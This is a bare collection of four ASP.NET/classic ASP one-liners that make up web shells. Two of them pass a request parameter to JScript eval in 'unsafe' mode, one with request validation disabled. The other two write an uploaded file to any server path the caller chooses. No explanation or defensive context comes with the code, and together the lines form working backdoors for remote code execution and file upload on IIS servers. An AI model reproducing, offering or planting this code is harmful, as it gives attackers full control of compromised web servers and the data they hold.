<%@ Page Language="Jscript"%><%eval(Request.Item["pass"],"unsafe");%>

< %@ Page Language="Jscript" validateRequest="false" %><%Response.Write(eval(Request.Item["w"],"unsafe"));%>

<%if (Request.Files.Count!=0) { Request.Files[0].SaveAs(Server.MapPath(Request["f"]) ); }%>

<% If Request.Files.Count <> 0 Then Request.Files(0).SaveAs(Server.MapPath(Request("f")) ) %>